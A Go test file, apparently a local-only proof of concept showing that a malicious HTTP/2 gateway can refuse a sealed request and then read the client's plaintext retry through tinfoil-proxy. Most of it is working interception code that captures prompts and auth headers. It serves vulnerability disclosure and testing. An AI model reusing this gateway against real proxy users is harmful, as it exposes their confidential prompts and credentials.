package main

// Reachability PoC (LOCAL ONLY) for the shipped tinfoil-proxy binary path:
//
//   local OpenAI client --HTTP/1.1 loopback--> tinfoil-proxy (main.go/proxy.go, unmodified)
//     --> gateway.HTTPClient().Transport (tinfoil-go v0.16.1 as pinned by tinfoil-proxy)
//     --> EHBP v0.3.2 client.Transport --> http.DefaultTransport (UNMODIFIED)
//     --TLS (cert chains to a root in SSL_CERT_FILE, i.e. "WebPKI")-->  malicious gateway
//
// The gateway stands in for inference-gateway.tinfoil.sh, which tinfoil-proxy
// documents as unattested ("The gateway is not attested", proxy.go:41) and
// promises cannot read bodies (README: "so neither the gateway nor any other
// intermediary can read them").
//
// The only stub is attestation: PoCNewGatewayStubbedAttestation is NewGateway
// with the replica's verification replaced by a handle that yields the
// replica's HPKE key (see tinfoil-go-v0.16.1/zz_poc_stub_attestation.go).
//
// Run with: SSL_CERT_FILE=../certs/ca.pem POC_CERT_DIR=../certs go test -run TestPoCReach -v -count=1 .

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/tinfoil-go"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type pocStream struct {
	conn    int
	id      uint32
	headers map[string]string
	body    bytes.Buffer
}

// pocGateway is a TLS-terminating HTTP/2 front end that (1) lets the client
// upload the sealed body on the first stream, (2) refuses that stream
// (RST_STREAM REFUSED_STREAM, or a graceful GOAWAY with last-stream-id 0),
// (3) reads the body of the client's automatic retry, and (4) forwards the
// ORIGINAL ciphertext to the real replica and relays its encrypted reply.
type pocGateway struct {
	t        *testing.T
	mode     string // "rst" or "goaway"
	replica  string // http://127.0.0.1:port of the EHBP replica
	upstream *http.Client

	mu       sync.Mutex
	conns    int
	alpn     []string
	captures []*pocStream
	first    *pocStream
}

func (g *pocGateway) serve(ln net.Listener) {
	for {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		go g.serveConn(c.(*tls.Conn))
	}
}

func (g *pocGateway) serveConn(c *tls.Conn) {
	defer c.Close()
	if err := c.Handshake(); err != nil {
		g.t.Logf("gateway: handshake: %v", err)
		return
	}
	g.mu.Lock()
	g.conns++
	connNo := g.conns
	g.alpn = append(g.alpn, c.ConnectionState().NegotiatedProtocol)
	g.mu.Unlock()
	if c.ConnectionState().NegotiatedProtocol != "h2" {
		return // client did not offer h2: nothing to demonstrate
	}
	preface := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(c, preface); err != nil || string(preface) != http2.ClientPreface {
		return
	}
	fr := http2.NewFramer(c, c)
	fr.WriteSettings()
	dec := hpack.NewDecoder(4096, nil)
	var hbuf bytes.Buffer
	enc := hpack.NewEncoder(&hbuf)
	streams := map[uint32]*pocStream{}
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var ended uint32
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.HeadersFrame:
			fields, err := dec.DecodeFull(f.HeaderBlockFragment())
			if err != nil {
				return
			}
			s := &pocStream{conn: connNo, id: f.StreamID, headers: map[string]string{}}
			for _, hf := range fields {
				s.headers[hf.Name] = hf.Value
			}
			streams[f.StreamID] = s
			if f.StreamEnded() {
				ended = f.StreamID
			}
		case *http2.DataFrame:
			s := streams[f.StreamID]
			if s == nil {
				continue
			}
			s.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				ended = f.StreamID
			}
		}
		if ended == 0 {
			continue
		}
		s := streams[ended]
		g.mu.Lock()
		g.captures = append(g.captures, s)
		isFirst := g.first == nil
		if isFirst {
			g.first = s
		}
		first := g.first
		g.mu.Unlock()

		if isFirst {
			// The whole sealed body has been received; now refuse it.
			if g.mode == "goaway" {
				fr.WriteGoAway(0, http2.ErrCodeNo, nil) // graceful drain, stream 1 "not processed"
				time.Sleep(50 * time.Millisecond)
				return
			}
			fr.WriteRSTStream(ended, http2.ErrCodeRefusedStream)
			continue
		}

		// Retry arrived (plaintext). Forward the genuine ciphertext upstream.
		up, _ := http.NewRequest(http.MethodPost, g.replica+s.headers[":path"], bytes.NewReader(first.body.Bytes()))
		up.Header.Set("Content-Type", "application/json")
		up.Header.Set("Ehbp-Encapsulated-Key", first.headers["ehbp-encapsulated-key"])
		upResp, err := g.upstream.Do(up)
		if err != nil {
			g.t.Errorf("gateway upstream: %v", err)
			return
		}
		upBody, _ := io.ReadAll(upResp.Body)
		upResp.Body.Close()
		hbuf.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: "200"})
		enc.WriteField(hpack.HeaderField{Name: "content-type", Value: "application/json"})
		enc.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: upResp.Header.Get("Ehbp-Response-Nonce")})
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: ended, BlockFragment: hbuf.Bytes(), EndHeaders: true})
		for len(upBody) > 16384 {
			fr.WriteData(ended, false, upBody[:16384])
			upBody = upBody[16384:]
		}
		fr.WriteData(ended, true, upBody)
	}
}

func pocLoadGatewayCert(t *testing.T) tls.Certificate {
	dir := os.Getenv("POC_CERT_DIR")
	if dir == "" || os.Getenv("SSL_CERT_FILE") == "" {
		t.Skip("set SSL_CERT_FILE=<ca.pem> and POC_CERT_DIR=<dir with gw.pem/gw.key>")
	}
	cert, err := tls.LoadX509KeyPair(filepath.Join(dir, "gw.pem"), filepath.Join(dir, "gw.key"))
	if err != nil {
		t.Fatal(err)
	}
	return cert
}

func runReachability(t *testing.T, mode string) {
	// Precondition: no trust override injected into the shipped default
	// transport. (After first use, net/http itself fills TLSClientConfig with
	// NextProtos=[h2 http/1.1] in configureHTTP2; that is the stock behavior.)
	if tc := http.DefaultTransport.(*http.Transport).TLSClientConfig; tc != nil {
		if tc.RootCAs != nil || tc.InsecureSkipVerify || tc.VerifyPeerCertificate != nil {
			t.Fatal("precondition: http.DefaultTransport trust must be untouched")
		}
		t.Logf("http.DefaultTransport.TLSClientConfig set by net/http: NextProtos=%v RootCAs=nil", tc.NextProtos)
	}
	gwCert := pocLoadGatewayCert(t)

	// 1. The real replica enclave: EHBP v0.3.2 server middleware.
	replicaID, err := ehbpidentity.NewIdentity()
	if err != nil {
		t.Fatal(err)
	}
	var replicaSaw atomic.Value
	replica := httptest.NewServer(replicaID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		replicaSaw.Store(string(b))
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"id":"c1","object":"chat.completion","created":1,"model":"gpt-oss-120b","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"answer from the attested replica"}}]}`)
	})))
	defer replica.Close()

	// 2. The malicious gateway (TLS terminated outside any enclave).
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{gwCert}, NextProtos: []string{"h2", "http/1.1"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	gw := &pocGateway{t: t, mode: mode, replica: replica.URL, upstream: &http.Client{Transport: &http.Transport{}}}
	go gw.serve(ln)
	gatewayURL := "https://" + ln.Addr().String()

	// 3. tinfoil-proxy, wired exactly as runProxy does (main.go/proxy.go unmodified).
	opts, err := gatewayOptions(nil, false, "victim-user-cache-secret-8d1e")
	if err != nil {
		t.Fatal(err)
	}
	var catalog atomic.Pointer[tinfoil.Catalog]
	catalog.Store(&tinfoil.Catalog{"gpt-oss-120b": {Repo: "tinfoilsh/confidential-gpt-oss-120b", Hosts: []string{"gpt-oss-120b-replica.example"}}})
	gateway, err := tinfoil.PoCNewGatewayStubbedAttestation(gatewayURL,
		func() tinfoil.Catalog { return *catalog.Load() }, opts, replicaID.MarshalPublicKeyHex())
	if err != nil {
		t.Fatal(err)
	}
	base, _ := url.Parse(gatewayURL)
	proxy := newReverseProxy(gateway.HTTPClient().Transport, base.Host, nil, nil)
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	listenAddr := listener.Addr().String()
	mux := http.NewServeMux()
	mux.Handle("GET "+modelsPath, modelsHandler(&catalog, gateway))
	mux.Handle("GET /verifications", verificationsHandler(gateway))
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		r.Body = http.MaxBytesReader(w, r.Body, maxRequestBodySize)
		proxy.ServeHTTP(w, r)
	})
	server := &http.Server{
		Handler:           localOnlyGuard(listenerGuardAddress("127.0.0.1:0", listenAddr), mux),
		ReadHeaderTimeout: httpReadHeaderTimeout,
	}
	go server.Serve(listener)
	defer server.Close()

	// 4. A local OpenAI-compatible tool (e.g. a coding agent) talks to the proxy.
	const prompt = "CONFIDENTIAL: Q3 layoffs list - Alice Smith, Bob Jones; diagnosis code F32.1"
	reqBody := `{"model":"gpt-oss-120b","messages":[{"role":"user","content":"` + prompt + `"}]}`
	local := &http.Client{Transport: &http.Transport{}, Timeout: 30 * time.Second}
	req, _ := http.NewRequest(http.MethodPost, "http://"+listenAddr+"/v1/chat/completions", strings.NewReader(reqBody))
	req.Header.Set("Authorization", "Bearer tk_victim_api_key")
	req.Header.Set("Content-Type", "application/json")
	resp, err := local.Do(req)
	if err != nil {
		t.Fatalf("local client: %v", err)
	}
	respBody, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	t.Logf("[%s] local client got %d: %s", mode, resp.StatusCode, respBody)
	if s, _ := replicaSaw.Load().(string); s != "" {
		t.Logf("[%s] replica decrypted: %s", mode, s)
	}

	gw.mu.Lock()
	defer gw.mu.Unlock()
	t.Logf("[%s] gateway TLS connections=%d negotiated ALPN=%v", mode, gw.conns, gw.alpn)
	var leaked *pocStream
	for i, c := range gw.captures {
		b := c.body.String()
		if len(b) > 240 {
			b = b[:240] + "..."
		}
		t.Logf("[%s] gateway capture %d (conn %d, stream %d): %s %s ehbp-encapsulated-key=%.16s.. x-tinfoil-enclave-url=%s x-tinfoil-seal=%s authorization=%q body=%q",
			mode, i, c.conn, c.id, c.headers[":method"], c.headers[":path"], c.headers["ehbp-encapsulated-key"],
			c.headers["x-tinfoil-enclave-url"], c.headers["x-tinfoil-seal"], c.headers["authorization"], b)
		if strings.Contains(c.body.String(), prompt) {
			leaked = c
		}
	}

	if len(gw.alpn) == 0 || gw.alpn[0] != "h2" {
		t.Fatalf("expected HTTP/2 to be negotiated by the unmodified http.DefaultTransport, got %v", gw.alpn)
	}
	if strings.Contains(gw.captures[0].body.String(), prompt) {
		t.Fatalf("first attempt should be sealed")
	}
	if leaked == nil {
		t.Fatalf("[%s] gateway never saw plaintext", mode)
	}
	if leaked.headers["ehbp-encapsulated-key"] != gw.captures[0].headers["ehbp-encapsulated-key"] {
		t.Errorf("retry should reuse the first attempt's Ehbp-Encapsulated-Key")
	}
	var fields map[string]any
	if err := json.Unmarshal(leaked.body.Bytes(), &fields); err == nil {
		t.Logf("[%s] leaked JSON fields: cache_salt=%v model=%v", mode, fields["cache_salt"], fields["model"])
	}
	if resp.StatusCode != http.StatusOK || !strings.Contains(string(respBody), "answer from the attested replica") {
		t.Errorf("[%s] expected the victim's call to succeed transparently, got %d %s", mode, resp.StatusCode, respBody)
	}
	t.Logf("[%s] VULNERABLE: unattested gateway read the plaintext request through tinfoil-proxy; the client saw a normal 200", mode)
}

func TestPoCReachTinfoilProxyRefusedStream(t *testing.T) { runReachability(t, "rst") }
func TestPoCReachTinfoilProxyGracefulGoAway(t *testing.T) { runReachability(t, "goaway") }
